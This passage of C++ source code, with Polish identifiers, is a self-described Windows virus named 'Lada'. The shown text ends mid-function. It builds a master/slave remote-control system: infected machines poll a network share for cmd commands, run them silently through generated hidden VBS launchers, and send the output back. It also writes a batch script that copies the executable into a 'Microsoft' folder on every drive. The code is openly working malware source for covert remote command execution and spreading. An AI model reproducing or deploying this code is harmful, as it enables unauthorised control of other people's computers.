#include <iostream>
#include <fstream>
#include <cstdlib>
#define _WIN32_WINNT 0x0500
#include <windows.h>
#include <conio.h>

using namespace std;

string alfabet="abcdefghijklmnoprstuwxyzvq",edit_ip;
string wersja="MarkoSoft ",wirus="Lada",folder="Loda",nr_w="1.0";
char w_slesz=92, s_slesz=47, cudz=34,odp;
string lokalny="127.0.0.1",kompy[100];
int x;

class Polecenia
{
    public:

    string pol;
    string linia;
    string cel;

    int nr_pc=0,koniec=0;

    void Komputer()
    {
        nr_pc=0;

        if(x>0)
        {

            while(koniec==0)
            {
                fflush( stdin );

                cout << "Podaj numer komputera: ";
                cin >> nr_pc;

                if(((nr_pc<1)||(nr_pc>x))&&(nr_pc!=0))
                {
                    cout << "Nie ma tego komputera na liscie!" << endl;
                    Sleep(1000);
                }
                else if(nr_pc==0)
                {
                    koniec=1;
                }
                else
                {
                    koniec=2;
                }
            }

        }
        else
        {
            cout << "Brak dostepnych komputerow" << endl;
            Sleep(2000);
            koniec=0;
        }
    }

    void Polecenie()
    {
        if((koniec==2)&&(x>0))
        {
            fflush( stdin );

            cout << "Polecenie: ";
            getline(cin,pol);

            if(pol=="0")
            {
                koniec = 1;
            }
            else
            {
                cel = kompy[nr_pc];
            }
        }
        else
        {

        }
    }

    void Wynik()
    {
        if(((nr_pc<1)||(nr_pc>x))&&(nr_pc!=0))
        {

        }
        else if((nr_pc==0)||(pol=="0"))
        {

        }
        else
        {
            system("if exist Wynik.txt del Wynik.txt");

            cout << "========================================" << endl;
            cout << "Wynik: "<< endl;
            cout << "----------------------------------------" << endl;

            fstream WP; //Wyslij Polecenie

            WP.open("WP.bat",ios::out);

            if(WP.good()==false)
            {
                WP.clear();
                WP.close();

                cout << "Nie mozna utworzyc pliku WP.bat" << endl;
            }
            else
            {
                WP << "@echo off" << endl;
                WP << "Title WP" << endl;
                WP << "if exist "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Wynik.txt goto ist"<< endl;
                WP << "goto pol" << endl;
                WP << ":ist" << endl;
                WP << "del "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Wynik.txt"<< endl;
                WP << ":pol" << endl;
                WP << "echo "<<cel<<"> Polecenie.txt" << endl;
                WP << "echo "<<pol<<">> Polecenie.txt" << endl;
                WP << "timeout 1" << endl;
                WP << "xcopy Polecenie.txt "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana "<<s_slesz<<"Y "<<s_slesz<<"Q"<< endl;
                WP << "exit" << endl;

                WP.clear();
                WP.close();
            }

            Sleep(1000);

            system("if exist WP.bat start WP.vbs");

            for(int i=0;i<10;i++)
            {
                fstream ODP;

                ODP.open("ODP.bat",ios::out);

                if(ODP.good()==false)
                {
                    ODP.clear();
                    ODP.close();

                    cout << "Nie mozna utworzyc pliku ODP.bat" << endl;
                }
                else
                {

                    ODP << "@echo off" << endl;
                    ODP << "Title ODP" << endl;
                    ODP << "if exist "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Wynik.txt goto ist" << endl;
                    ODP << "goto koniec" << endl;
                    ODP << ":ist" << endl;
                    ODP << "xcopy "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Wynik.txt "<<s_slesz<<"Y "<<s_slesz<<"Q"<< endl;
                    ODP << ":koniec" << endl;
                    ODP << "exit" << endl;

                    ODP.clear();
                    ODP.close();
                }

                Sleep(1000);

                system("if exist ODP.bat start ODP.vbs");

                Sleep(1000);

                fstream Wynik;

                Wynik.open("Wynik.txt",ios::in);

                if(Wynik.good()==false)
                {

                    Wynik.clear();
                    Wynik.close();

                    cout << "====" ;
                }
                else
                {
                    cout << endl;

                    string linia;

                    while(getline(Wynik,linia))
                    {
                        cout << linia << endl;
                    }

                    i=10;

                    Wynik.clear();
                    Wynik.close();
                }
            }

            cout << endl;
            cout << "----------------------------------------" << endl;
            //getchar();
        }

    }

    void Odswierz()
    {
        fstream ODSW;

        ODSW.open("Odswierz.bat",ios::out);

        if(ODSW.good()==false)
        {

            ODSW.clear();
            ODSW.close();

            cout << wersja << "Nie mozna utworzyc pliku Odswierz.bat" << endl;
        }
        else
        {

            ODSW << "@echo off" << endl;
            ODSW << "Title Odswierz" << endl;
            ODSW << "if exist "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Lista_PC.txt goto istnieje" << endl;
            ODSW << "goto ods" << endl;
            ODSW << ":istnieje" << endl;
            ODSW << "del "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Lista_PC.txt"<< endl;
            ODSW << ":ods" << endl;
            ODSW << "if exist Lista_PC.txt del Lista_PC.txt" << endl;
            ODSW << "echo MarkoSoft >> "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt"<<endl;
            ODSW << "exit" << endl;

            ODSW.clear();
            ODSW.close();

            system("cls");

            cout << "[                           ]-[ODSWIERZANIE...]" << endl;

            Sleep(1000);

            system("start Odswierz.vbs");

            system("cls");
            cout << "[===                        ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[======                     ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[=========                  ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[============               ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[===============            ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[==================         ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[=====================      ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[========================   ]-[ODSWIERZANIE...]" << endl;
            Sleep(1000);
            system("cls");
            cout << "[===========================]-[ZAKONCZONO]" << endl;
            Sleep(1000);
        }
    }
};

void Master_VBS()
{
    //system("if exist Lista.vbs del Lista.vbs");

    fstream Plik;

    Plik.open("Lista.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku Lista.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"Lista.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h Lista.vbs");

    //system("if exist WP.vbs del WP.vbs");

    Plik.open("WP.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku WP.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"WP.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h WP.vbs");

    Plik.open("Odswierz.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku Odswierz.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"Odswierz.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h Odswierz.vbs");

    Plik.open("ODP.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku ODP.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"ODP.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h ODP.vbs");
}

void Slave_VBS()
{
    //system("if exist Pobieranie.vbs del Pobieranie.vbs");

    fstream Plik;

    Plik.open("Pobieranie.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku Pobieranie.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"Pobieranie.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h Pobieranie.vbs");

    //system("if exist Start.vbs del Start.vbs");

    Plik.open("Start.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku Start.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"Start.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h Start.vbs");

    //system("if exist NLK.vbs del NLK.vbs");

    Plik.open("NLK.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku NLK.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"NLK.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h NLK.vbs");

    //system("if exist Odswierz.vbs del Odswierz.vbs");

    Plik.open("Odswierz.vbs",ios::out);

    if(Plik.good()==false)
    {

        Plik.clear();
        Plik.close();

        cout << "Nie mozana utworzyc pliku NLK.vbs" << endl;
    }
    else
    {
        Plik << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")"<< endl;
        Plik << "WshShell.Run chr(34) & "<<cudz<<"Odswierz.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        Plik << "Set WshShell = Nothing" << endl;

        Plik.clear();
        Plik.close();
    }

    system("attrib +h Odswierz.vbs");
}

void Wykrycie_Adresacji()
{
    system("ipconfig /all > Adresy.txt");

    fstream Adresy;

    Adresy.open("Adresy.txt",ios::in);

    if(Adresy.good()==false)
    {

        Adresy.clear();
        Adresy.close();

        cout << wersja << "Nie mozna otworzyc pliku Adresy.txt" << endl;
    }
    else
    {

        string linia,zawartosc[1000],ip[10],mac[10];
        int nr_l=0,adr=0;


        while(getline(Adresy,linia))
        {
            zawartosc[nr_l]=linia;
            nr_l++;
        }

        while(nr_l>=0)
        {
            size_t pozycja = zawartosc[nr_l].find("Default Gateway");

            if(pozycja!=string::npos)
            {
                ip[adr] = zawartosc[nr_l].substr(pozycja+36,15);
                //ip[adr] = zawartosc[nr_l];
                cout << "Adres Bramy: " << ip[adr] << endl;
                adr++;

                nr_l = nr_l - 3;

                size_t pozycja_a = zawartosc[nr_l].find("Subnet Mask");

                if(pozycja_a!=string::npos)
                {
                    mac[adr] = zawartosc[nr_l].substr(pozycja_a+36,15);
                    //mac[adr] = zawartosc[nr_l];
                    cout << "Adres MAC: " << mac[adr] << endl;
                    adr++;
                }
                else
                {
                    cout << "Brak adresu MAC" << endl;
                    mac[adr]=" ";
                    adr++;
                }
            }
            else
            {

            }

            nr_l--;
        }

        Adresy.clear();
        Adresy.close();

        int kolejka=0;

        for(int i=0;i<adr-1;i=i+2)
        {
            size_t pozycja = ip[i].find(".");
            size_t pozycja_a = mac[i+1].find(".");

            cout << ip[i] << endl;
            cout << mac[i+1] << endl;

            if((pozycja!=string::npos)&&(pozycja_a!=string::npos))
            {
                cout << wersja << "Znalazlam" << endl;
                cout << wersja << "Rozpoczynam generowanie skryptu serwera..." << endl;

                int dlugosc=0;

                dlugosc = dlugosc + pozycja;

                string chwilowa=ip[i];

                chwilowa.erase(0,pozycja+1);

                cout << chwilowa << endl;

                size_t p_a = chwilowa.find(".");

                if(p_a!=string::npos)
                {
                    chwilowa.erase(0,p_a+1);

                    dlugosc = dlugosc + pozycja;

                    cout << chwilowa << endl;

                    size_t p_b = chwilowa.find(".");

                    if(p_b!=string::npos)
                    {
                        chwilowa.erase(0,p_b+1);

                        dlugosc = dlugosc + pozycja;

                        cout << "Ostatni okted: "<< chwilowa << endl;
                        cout << "Pozycja ostatniej kropki : " << dlugosc << endl;
                        cout << "Orginalny: "<< ip[i] << endl;

                        ip[i].replace(dlugosc+1,3,"239");

                        cout << "Edytowany: "<< ip[i] << endl;

                        //Generator skryptu

                        if(kolejka==0)
                        {
                            kolejka = 1;

                            system("if exist Pobieranie.bat del Pobieranie.bat");

                            edit_ip = ip[i]; // BEDZIE PRZEZ TO DUZO PROBLEMOW!!!!

                            fstream Download;

                            Download.open("Pobieranie.bat",ios::out);

                            if(Download.good()==false)
                            {
                                cout << wersja << "Nie moge stworzyc pliku Pobieranie.bat" << endl;

                                Download.clear();
                                Download.close();
                            }
                            else
                            {

                                Download << "@echo off" << endl;
                                Download << "Title Pobieranie" << endl;

                                Download << ":start" << endl;
                                Download << "if exist "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt goto copr_"<< i << endl;
                                Download << "if exist "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt goto odsw_"<< i <<endl;
                                Download << "goto copr_"<< i << i << endl;
                                Download << ":odsw_"<< i <<endl;
                                Download << "xcopy "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt "<<s_slesz<<"Y "<<s_slesz<<"Q"<< endl;
                                Download << "timeout 3" << endl;
                                Download << "del "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt" << endl;
                                Download << "goto copr_"<< i << i << endl;
                                Download << ":copr_" << i << endl;
                                Download << "xcopy "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt " <<s_slesz<<"Y "<<s_slesz<<"Q" << endl;
                                Download << "timeout 3" << endl;
                                Download << "del "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt" << endl;
                                Download << ":copr_" << i << i << endl;

                                Download.clear();
                                Download.close();
                            }
                        }
                        else
                        {
                            fstream Download;

                            Download.open("Pobieranie.bat",ios::out|ios::app);

                            if(Download.good()==false)
                            {
                                cout << wersja << "Nie moge dodac danych do pliku Pobieranie.bat" << endl;

                                Download.clear();
                                Download.close();
                            }
                            else
                            {

                                /*
                                Download << "if exist "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt goto copr_"<< i << endl;
                                Download << "goto copr_"<< i << i << endl;
                                Download << ":copr_" << i << endl;
                                Download << "xcopy "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt "<<s_slesz<<"Y "<<s_slesz<<"Q" << endl;
                                Download << "timeout 3" << endl;
                                Download << "del "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt" << endl;
                                Download << ":copr_" << i << i << endl;
                                */
                                Download << "if exist "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt goto copr_"<< i << endl;
                                Download << "if exist "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt goto odsw_"<<i<<endl;
                                Download << "goto copr_"<< i << i << endl;
                                Download << ":odsw_"<< i <<endl;
                                Download << "xcopy "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt "<<s_slesz<<"Y "<<s_slesz<<"Q"<< endl;
                                Download << "timeout 3" << endl;
                                Download << "del "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt" << endl;
                                Download << "goto copr_"<< i << i << endl;
                                Download << ":copr_" << i << endl;
                                Download << "xcopy "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt " <<s_slesz<<"Y "<<s_slesz<<"Q" << endl;
                                Download << "timeout 3" << endl;
                                Download << "del "<<w_slesz<<w_slesz<<ip[i]<<w_slesz<<"Kochana"<<w_slesz<<"Polecenie.txt" << endl;
                                Download << ":copr_" << i << i << endl;

                                Download.clear();
                                Download.close();

                            }
                        }
                    }
                    else
                    {

                    }
                }
                else
                {

                }


            }
            else
            {
                cout << "Nie ma" << endl;
            }
        }

        fstream Download;

        Download.open("Pobieranie.bat",ios::out|ios::app);

        if(Download.good()==false)
        {
            cout << wersja << "Nie moge dodac danych do pliku Pobieranie.bat" << endl;

            Download.clear();
            Download.close();
        }
        else
        {
            //Download << "echo MarkoSoft >> Koniec.txt" << endl;
            //Download << "exit" << endl;

            Download << "goto start" << endl;

            Download.clear();
            Download.close();
        }

    }

    system("attrib +h Pobieranie.bat");
}

void Zdalny()
{
    system("start Pobieranie.vbs");
    //system("start Pobieranie.bat");

    for(;;)
    {
        Sleep(1000);

        fstream Odswierzacz;

        Odswierzacz.open("Odswierz.txt",ios::in);

        if(Odswierzacz.good()==false)
        {

            Odswierzacz.clear();
            Odswierzacz.close();

            cout << "Nie odswierzam" << endl;
        }
        else
        {
            Odswierzacz.clear();
            Odswierzacz.close();

            system("if exist Odswierz.txt del Odswierz.txt");

            fstream NLK; //Nowa Lista Komputerow

            NLK.open("NLK.bat",ios::out);

            if(NLK.good()==false)
            {
                NLK.clear();
                NLK.close();

                cout << "Nie mozna utworzyc pliku NLK.bat" << endl;//Zapisany
            }
            else
            {

                NLK << "@echo off" << endl;
                NLK << "Title NLK" << endl;
                NLK << "hostname >> "<<w_slesz<<w_slesz<<edit_ip<<w_slesz<<"Kochana"<<w_slesz<<"Lista_PC.txt"<< endl;
                NLK << "exit" << endl;

                NLK.clear();
                NLK.close();
            }

            Sleep(1000);

            system("attrib +h NLK.vbs");
            system("start NLK.vbs");

        }

        fstream Wykonaj;

        Wykonaj.open("Polecenie.txt",ios::in);

        if(Wykonaj.good()==false)
        {
            Wykonaj.clear();
            Wykonaj.close();

            cout << wersja << "Brak pliku Polecenie.txt" << endl;
        }
        else
        {
            string linia, pol[5];

            int o=0;

            while(getline(Wykonaj,linia))
            {
                cout << linia;
                pol[o]=linia;
                o++;
            }

            Wykonaj.clear();
            Wykonaj.close();

            system("if exist Polecenie.txt del Polecenie.txt");

            fstream HOST;

            HOST.open("Host.txt",ios::in);

            if(HOST.good()==false)
            {
                HOST.clear();
                HOST.close();

                cout << "Nie mozna otworzyc pliku Host.txt!" << endl;
            }
            else
            {
                getline(HOST,linia);
                {
                    pol[o]=linia;
                    o++;
                }

                HOST.clear();
                HOST.close();
            }

            if(pol[0]==pol[2])
            {

                system("if exist Polecenie.txt del Polecenie.txt");

                fstream Start;

                Start.open("Start.bat",ios::out);

                if(Start.good()==false)
                {
                    Start.clear();
                    Start.close();
                }
                else
                {
                    Start << "@echo off" << endl;
                    Start << "Title Start" << endl;
                    Start << pol[1] <<" > "<<w_slesz<<w_slesz<<edit_ip<<w_slesz<<"Kochana"<<w_slesz<<"Wynik.txt"<< endl;
                    Start << pol[1] << " >> "<<w_slesz<<w_slesz<<edit_ip<<w_slesz<<"Kochana"<<w_slesz<<"Historia.txt" << endl;
                    Start << "exit" << endl;

                    Start.clear();
                    Start.close();
                }

                cout << "ODPALAM START" << endl;

                //system("attrib +h Start.bat");
                system("start Start.vbs");
            }
            else
            {
                cout << "Nie ja mam je wykonac" << endl; //nie dziala bo przed nazwa komputera jest spacja
                cout <<"KompA: " <<pol[0] <<" Polecenie: "<<pol[1]<<" KompB: "<<pol[2]<<endl;
            }
        }

    }
}

void Slave_Aktywacja()
{
    system("hostname > Host.txt");

    Slave_VBS();
    Wykrycie_Adresacji();
    Zdalny();
}

void Lista_PC()
{
    fstream LISTA;

    LISTA.open("Lista.bat",ios::out);

    if(LISTA.good()==false)
    {
        LISTA.clear();
        LISTA.close();

        cout << "Nie mozna utworzyc pliku Lista.bat" << endl;
    }
    else
    {

        LISTA << "@echo off" << endl;
        LISTA << "Title Lista" << endl;
        LISTA << "if exist "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Lista_PC.txt goto istnieje"<< endl;
        LISTA << "if exist "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt goto ist_ods"<< endl;
        LISTA << "goto wyjscie" << endl;
        LISTA << ":istnieje" << endl;
        LISTA << "xcopy "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Lista_PC.txt "<<s_slesz<<"Y "<<s_slesz<<"Q"<< endl;
        LISTA << "if exist "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt goto ist_ods"<< endl;
        LISTA << ":wyjscie" << endl;
        LISTA << "exit" << endl;
        LISTA << ":ist_ods" << endl;
        LISTA << "del "<<w_slesz<<w_slesz<<lokalny<<w_slesz<<"Kochana"<<w_slesz<<"Odswierz.txt"<< endl;
        LISTA << "goto wyjscie" << endl;

        LISTA.clear();
        LISTA.close();
    }

    Sleep(1000);

    system("if exist Lista.bat start Lista.vbs");

    Sleep(2000);

    fstream LPC;

    LPC.open("Lista_PC.txt",ios::in);

    if(LPC.good()==false)
    {

        LPC.clear();
        LPC.close();

        cout << "Nie odnaleziono pliku Lista_PC.txt" << endl;
    }
    else
    {

        string linia;

        x=0;

        while(getline(LPC,linia))
        {
            x++;
            kompy[x]=linia;
            cout <<x<<". "<< linia << endl;

        }

        LPC.clear();
        LPC.close();
    }
}

void Szefi()
{

    //Polecenie p1;

    int koniec=0;
    int l=0;

    while(koniec==0)
    {
        system("cls");

        l=0;

        while(wersja[l]!=0)
        {
            cout << wersja[l];
            l++;
            Sleep(20);
        }

        cout << nr_w << endl;

        cout << "===================================" << endl;
        cout << "Lista podwladnych komputerow:" << endl;
        cout << "===================================" << endl;

        Lista_PC();

        cout << "===================================" << endl;
        cout << "O.Odswierz liste komputerow" << endl;
        cout << "P.Polecenia" << endl;
        cout << "H.Pomoc" << endl;
        cout << "W.Wyjscie" << endl;
        cout << "===================================" << endl;

        fflush( stdin );

        char odp_a = getch();

        switch(odp_a)
        {

            case 'h':
            {
                system("cls");

                l=0;

                while(wersja[l]!=0)
                {
                    cout << wersja[l];
                    l++;
                    Sleep(20);
                }

                    cout << nr_w << endl;

                    cout << "==============================================================" << endl;
                    cout << "Pomoc:" << endl;
                    cout << "==============================================================" << endl;
                    cout << endl;
                    cout << "1.ODSWIERZANIE" << endl;
                    cout << "W pierwszej kolejnosci "<<wersja<<" sprawdza czy istnieje" << endl;
                    cout << "plik z lista komputerow, po czym laduje ja do pamieci" << endl;
                    cout << "i wyswietla w programie. Liste zaleca sie odswierzac" << endl;
                    cout << "przed proba wydania polecenia jak i przy pierwszym starcie" << endl;
                    cout << "programu by miec swierza liste dostepnych komputerow" << endl;
                    cout << endl;
                    cout << "2.POLECENIA" << endl;
                    cout << "Polecenia jakie mozna wydawac komputerom podwladdnym" << endl;
                    cout << "to nic innego jak polecenia z konsoli CMD z podstawowymi" << endl;
                    cout << "uprawnieniami, bedzie tez opcja uruchomienia komendy" << endl;
                    cout << "z prawami Administratora lecz w przyszlej wersjii Aniolka" << endl;
                    cout << endl;
                    cout << "3.TRESC POLECENIA" << endl;
                    cout << "Przed wyslaniem polecenia, nalezy wybrac komputer ktory ma je " << endl;
                    cout << "wykonac!" << endl;
                    cout << "==============================================================" << endl;
                    cout << "Kliknij ENTER by kontynuowac" << endl;
                    cout << "============================" << endl;
                    getchar();
            }
            break;

            case 'p':
            {
                Polecenia p1;

                p1.Komputer();

                while(p1.koniec==2)
                {
                    p1.Polecenie();
                    p1.Wynik();
                }


            }
            break;

            case 'w':
            {
                koniec = 1;
            }
            break;

            case 'o':
            {
                Polecenia p1;

                p1.Odswierz();
            }
            break;

            default:
            {
                cout << wersja << "Nie wiem czego ty chcesz..." << endl;
                Sleep(2000);
            }
            break;
        }
    }
}

void Sprawdzacz_Dyskow_Twardych()
{

    system("if exist SDT.bat del SDT.bat /a");

    fstream SDT;

    SDT.open("SDT.bat",ios::out);

    if(SDT.good()==false)
    {
        SDT.clear();
        SDT.close();

        cout << wersja << "Nie moge utworzyc pliku STD.bat!" << endl;
    }
    else
    {
        SDT << "@echo off" << endl;
        SDT << "Title SDT" << endl;
        SDT << ":sprawdzenie_HDD" << endl;

        int e=0;

        while(alfabet[e]!=0)
        {
            SDT << "if exist "<< alfabet[e] << ":"<<w_slesz<<"Windows"<<w_slesz<<"System32 goto hdd_"<<alfabet[e]<< endl;
            e++;
        }

        e=0;

        while(alfabet[e]!=0)
        {
            SDT << ":hdd_"<< alfabet[e] << endl;
            SDT << "if exist "<< alfabet[e] <<":"<< w_slesz <<"Microsoft goto hdd_"<<alfabet[e]<<alfabet[e] << endl;
            SDT << "md "<< alfabet[e] <<":"<< w_slesz << "Microsoft" << endl;
            SDT << ":hdd_" << alfabet[e] << alfabet[e] << endl;
            SDT << "if exist "<< alfabet[e] <<":"<<w_slesz<<"Microsoft goto xhdd_"<<alfabet[e]<<alfabet[e] << endl;
            SDT << "goto hdd_"<<alfabet[e] << alfabet[e] << endl;
            SDT << ":xhdd_"<<alfabet[e] << alfabet[e] << endl;
            SDT << "echo "<<alfabet[e]<<" > DS.txt" << endl;
            SDT << "if exist "<<alfabet[e]<<":"<<w_slesz<<"Microsoft"<<w_slesz<<wirus<<".exe"<<" goto ihdd_"<<alfabet[e] << alfabet[e] << endl;
            SDT << "if not exist "<<wirus<<".exe goto exit" << endl;
            SDT << "xcopy "<<wirus<<".exe "<<alfabet[e]<<":"<<w_slesz<<"Microsoft"<<s_slesz<<"Y"<<s_slesz<<"Q"<< endl;
            SDT << "echo Emilia >> "<<alfabet[e]<<":"<<w_slesz<<"Microsoft"<<w_slesz<<"BOSS.txt" << endl;
            SDT << ":ihdd_"<<alfabet[e]<<alfabet[e]<<endl;
            SDT << "if exist "<<alfabet[e]<<":"<<w_slesz<<"Microsoft"<<w_slesz<<wirus<<".exe goto exit"<< endl;
            SDT << "goto ihdd_"<<alfabet[e]<<alfabet[e]<<endl;
            SDT << ":exit"<<endl;
            //SDT << "start "<<alfabet[e]<<":"<<w_slesz<<"Microsoft"<<w_slesz<<wirus<<".exe"<<endl;
            SDT << "exit" << endl;
            e++;
        }

        SDT.clear();
        SDT.close();
    }

    system("attrib +h SDT.bat");
    system("start sdt.vbs");
}

void Uniewidzialniacze_Skryptow()
{

    //SOF.bat SSSOF.bat SDT.bat

    system("if exist sof.vbs del sof.vbs /a");

    fstream VBS_SOF;

    VBS_SOF.open("sof.vbs",ios::out);

    if(VBS_SOF.good()==false)
    {

        VBS_SOF.clear();
        VBS_SOF.close();

        cout << "Nie moge utworzyc pliku > sof.vbs <" << endl;
    }
    else
    {

        VBS_SOF << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")" << endl;
        VBS_SOF << "WshShell.Run chr(34) & "<<cudz<<"SOF.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        VBS_SOF << "Set WshShell = Nothing" << endl;

        VBS_SOF.clear();
        VBS_SOF.close();
    }

    system("attrib +h sof.vbs");

    system("if exist sssof.vbs del sssof.vbs /a");

    fstream VBS_SSSOF;

    VBS_SSSOF.open("sssof.vbs",ios::out);

    if(VBS_SSSOF.good()==false)
    {

        VBS_SSSOF.clear();
        VBS_SSSOF.close();

        cout << wersja << "Nie moge utworzyc pliku > sssof.vbs <" << endl;
    }
    else
    {

        VBS_SSSOF << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")" << endl;
        VBS_SSSOF << "WshShell.Run chr(34) & "<<cudz<<"SSSOF.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        VBS_SSSOF << "Set WshShell = Nothing" << endl;

        VBS_SSSOF.clear();
        VBS_SSSOF.close();
    }

    system("attrib +h sssof.vbs");

    system("if exist sdt.vbs del sdt.vbs /a");

    fstream VBS_SDT;

    VBS_SDT.open("sdt.vbs",ios::out);

    if(VBS_SDT.good()==false)
    {

        VBS_SDT.clear();
        VBS_SDT.close();

        cout << wersja << "Nie moge utworzyc pliku > sdt.vbs <" << endl;
    }
    else
    {

        VBS_SDT << "Set WshShell = CreateObject("<<cudz<<"WScript.Shell"<<cudz<<")" << endl;
        VBS_SDT << "WshShell.Run chr(34) & "<<cudz<<"SDT.bat"<<cudz<<" & Chr(34), 0 "<< endl;
        VBS_SDT << "Set WshShell = Nothing" << endl;

        VBS_SDT.clear();
        VBS_SDT.close();
    }

    system("attrib +h sdt.vbs");
}

void Skrypt_Otwarcia_Folderu()
{

    system("if exist SOF.bat del SOF.bat /a");

    fstream SOF;

    SOF.open("SOF.bat",ios::out);

    if(SOF.good()==false)
    {
        SOF.clear();
        SOF.close();

        cout << wersja <<"Nie mozna utworzyc pliku SOF.bat" << endl;
        Sleep(2000);
    }
    else
    {
